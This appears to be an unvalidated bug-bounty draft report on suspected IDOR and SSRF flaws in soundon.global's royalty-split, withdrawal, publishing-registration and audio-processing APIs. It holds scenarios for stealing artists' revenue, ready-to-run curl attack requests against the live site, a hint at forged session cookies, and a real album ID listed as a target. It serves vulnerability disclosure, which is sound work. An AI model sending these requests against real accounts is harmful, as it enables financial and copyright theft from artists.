# TK-002: Royalty Split & Revenue Withdrawal IDOR — soundon.global (Account-Required PoC)

**Program:** TikTok HackerOne  
**Asset:** `www.soundon.global` / `*.soundon.global` [Critical, Eligible]  
**Severity:** HIGH 8.1 (estimated — requires account validation)  
**CVSS:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**CWE:** CWE-285 — Improper Authorization  
**Status:** PoC READY — requires test artist account to validate

---

## Background

Static analysis of soundon.global's production JavaScript bundle (`main.95b13d81.js`) revealed a complete API surface for financial and royalty management operations. Three endpoint families present high IDOR risk due to the presence of artist IDs or album IDs as user-controlled parameters in POST bodies.

SoundOn is TikTok's music distribution platform connecting artists to Spotify, Apple Music, and other DSPs. Artists receive royalty payments through the platform. Royalty splits allow artists to share revenue with collaborators (co-writers, producers).

---

## Attack Surface (Discovered via JS Bundle Analysis)

All endpoints confirmed in production bundle `main.95b13d81.js`:

```javascript
// Royalty Split endpoints
CreateAlbumSplit(e, t) {
    const i = `${this.uriPrefix}/split/album/create`;
    // Creates a royalty split — album ID likely in body
}

UpdateUserSplitSong(e, t) {
    const i = `${this.uriPrefix}/split/update-user-split-song`;
    // CRITICAL: Updates split assignment — song ID in body?
}

VerifySplitInviteCode(e, t) {
    const i = `${this.uriPrefix}/split/verify/split-code`;
    // Verifies invite code — if codes are predictable, IDOR
}

// Revenue endpoints
ListWalletStatement(e, t) → /revenue/statement/list
GetWithdrawLink(e, t) → /revenue/withdraw          ← HIGH RISK
GetTotalEarnings(e, t) → /revenue/royalty/total

// Publishing Registration
CreatePublishingRegistration(e, t) → /publishing/registration
CreateOutsideSongwriter(e, t) → /publishing/songwrite
SubmitTrackPublishing(e, t) → /publishing/track
```

---

## Hypothesis & Attack Scenarios

### Scenario 1: Unauthorized Royalty Split Addition (IDOR on split/update-user-split-song)

**Hypothesis:** The `/api/split/update-user-split-song` endpoint accepts a song ID controlled by the requesting user. If it does not verify that the requesting user OWNS the song:

1. Attacker registers as a SoundOn artist (free account)
2. Discovers/enumerates a target artist's song ID (song IDs may appear in public SoundOn profile URLs or `?albumID=` parameters from Wayback: `https://www.soundon.global/api/release?albumID=7578155288080386064`)
3. Calls `POST /api/split/update-user-split-song` with the target's song ID and attacker's account as a split recipient
4. Attacker receives a percentage of the target artist's royalties

**Financial impact:** Persistent revenue theft from any SoundOn artist.

### Scenario 2: Revenue Withdrawal Manipulation (IDOR on revenue/withdraw)

**Hypothesis:** The `/api/revenue/withdraw` endpoint accepts account identifiers. If artist ID is user-controlled:

1. Attacker calls `GET /api/revenue/balance` to enumerate balances
2. Calls `POST /api/revenue/withdraw` with target artist's account ID
3. Triggers withdrawal to attacker's configured bank account

### Scenario 3: Publishing Registration Fraud (IDOR on publishing/registration)

**Hypothesis:** The `/api/publishing/registration` endpoint registers music copyright. If it accepts arbitrary artist/song IDs:

1. Attacker registers copyright for another artist's unreleased song
2. Monetization rights redirected to attacker's account

### Scenario 4: SSRF via Audio Processing

**Hypothesis:** `/api/song/auto-mastering/analyse` and `/api/audio/remix/process` may accept audio file URLs for server-side processing:

```json
POST /api/song/auto-mastering/analyse
{"audio_url": "https://ssrf-bait.byted.org/full-read-ssrf"}
```

If the server fetches the URL → confirmed full-read SSRF (use TikTok's SSRF sheriff).

---

## Validation Steps (for user to execute with test account)

### Prerequisites
1. Create two test artist accounts on soundon.global (Account A = attacker, Account B = victim)
2. Create a test song/release with Account B
3. Note Account B's song ID from the API or profile

### Test 1: Royalty Split IDOR

```bash
# With Account A's session cookies:
curl -s -X POST "https://www.soundon.global/api/split/update-user-split-song" \
  -H "Cookie: <Account_A_session>" \
  -H "Content-Type: application/json" \
  -d '{
    "song_id": "<Account_B_song_id>",
    "artist_id": "<Account_A_id>",
    "split_percentage": 50
  }'

# Expected (secure): 403 Forbidden or "not owner"
# IDOR confirmed: 200 OK with success response
```

### Test 2: Revenue Balance Enumeration

```bash
# Try accessing another artist's balance
curl -s "https://www.soundon.global/api/revenue/balance?artist_id=<Account_B_id>" \
  -H "Cookie: <Account_A_session>"

# OR if the endpoint uses ONLY session identity:
curl -s "https://www.soundon.global/api/revenue/balance" \
  -H "Cookie: <Account_B_session_forged_or_rotated>"
```

### Test 3: Publishing Registration Fraud

```bash
curl -s -X POST "https://www.soundon.global/api/publishing/registration" \
  -H "Cookie: <Account_A_session>" \
  -H "Content-Type: application/json" \
  -d '{
    "song_id": "<Account_B_song_id>",
    "artist_id": "<Account_A_id>",
    "registration_type": "PRO"
  }'
```

### Test 4: SSRF via Audio Processing

```bash
curl -s -X POST "https://www.soundon.global/api/song/auto-mastering/analyse" \
  -H "Cookie: <Account_A_session>" \
  -H "Content-Type: application/json" \
  -d '{
    "audio_url": "https://ssrf-bait.byted.org/full-read-ssrf"
  }'

# Check SSRF success at: https://sf-ssrf-sheriff.tiktokcdn.com/obj/ssrf-detector-us/<YOUR_FLAG>
```

---

## Album ID Discovery (from Wayback Machine)

Real album IDs found in Wayback (can be used as IDOR targets):

```
albumID=7578155288080386064
```

Source: `https://www.soundon.global/api/release?albumID=7578155288080386064&includes[tiktokLink]=true`

---

## Impact (if IDOR confirmed)

| Vulnerability | Impact | Severity |
|--------------|--------|---------|
| Royalty split addition without ownership | Revenue theft from any artist | CRITICAL 9.1 |
| Revenue withdrawal fraud | Direct financial theft | CRITICAL 9.1 |
| Publishing registration fraud | Copyright theft, revenue redirection | HIGH 8.1 |
| SSRF via audio processing | Internal network access | HIGH 7.5-8.6 |
| Revenue balance enumeration | PII exposure (earnings data) | MEDIUM 5.3 |

---

## Notes on Account Creation

- Register with `<username>+x@wearehackerone.com` format
- SoundOn allows registration via TikTok OAuth or Google OAuth
- Artist account (not just listener) required for financial endpoint access
- No real music distribution needed — test with draft releases

---

## References

- SoundOn API discovered from: `sf-fe.anotecdn.com/obj/anote-fe/soundon/client-home/static/js/main.95b13d81.js`
- All endpoints confirmed present in production bundle (2026-06-29)
- Wayback album ID: `web.archive.org/web/*/soundon.global/api/release?albumID=*`
- TikTok SSRF Sheriff: `https://ssrf-bait.byted.org/full-read-ssrf`
